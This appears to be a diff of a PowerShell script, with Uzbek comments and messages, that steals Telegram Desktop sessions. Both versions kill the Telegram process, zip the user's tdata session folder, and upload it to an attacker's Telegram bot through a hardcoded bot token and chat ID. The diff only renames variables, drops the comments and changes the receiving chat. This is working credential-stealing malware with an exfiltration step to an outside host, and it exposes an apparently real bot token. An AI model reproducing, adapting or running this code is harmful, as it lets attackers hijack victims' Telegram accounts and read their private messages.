@@ -1,37 +1,28 @@
-# --- SOZLAMALAR ---
 $token = "8649684929:AAGUPmSFkh3tLV6OkveTTX3nuIc4rCNjs_A"
-$chatId = "7068280080"
-# ------------------
+$chatId = "6190772023"
 
-$username = $env:USERNAME
-$tdata_path = "$env:APPDATA\Telegram Desktop\tdata"
-$zip_path = "$env:TEMP\tdata_$username.zip"
+$user = $env:USERNAME
+$tdata = "$env:APPDATA\Telegram Desktop\tdata"
+$zip = "$env:TEMP\tdata_$user.zip"
 
-# Telegram yopiq bo'lishini tekshirish (band bo'lsa nusxa ololmaydi)
 Stop-Process -Name "Telegram" -Force -ErrorAction SilentlyContinue
 
-if (Test-Path $tdata_path) {
+if (Test-Path $tdata) {
     try {
-        # Papkani ZIP qilish
+        if (Test-Path $zip) { Remove-Item $zip -Force }
+        
         Add-Type -A System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($tdata_path, $zip_path)
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($tdata, $zip)
         
-        # Faylni Telegram botga yuborish
-        $send_url = "https://api.telegram.org/bot$token/sendDocument"
-        $file_item = Get-Item $zip_path
-        $post_data = @{
-            chat_id = $chatId
-            document = $file_item
-            caption = "Muvaffaqiyatli! User: $username"
-        }
+        $url = "https://api.telegram.org/bot$token/sendDocument"
+        $postData = @{ chat_id = $chatId; document = Get-Item $zip }
+        Invoke-RestMethod -Uri $url -Method Post -Form $postData
         
-        Invoke-RestMethod -Uri $send_url -Method Post -Form $post_data
-        
-        # Yuborilgandan keyin vaqtinchalik ZIPni o'chirish
-        Remove-Item $zip_path -Force
+        Remove-Item $zip -Force
+        Write-Host "Tayyor! Botni tekshir."
     } catch {
-        Write-Host "Xatolik yuz berdi: $_"
+        Write-Host "Xatolik: $_"
     }
 } else {
-    Write-Host "tdata papkasi topilmadi!"
+    Write-Host "tdata topilmadi!"
 }
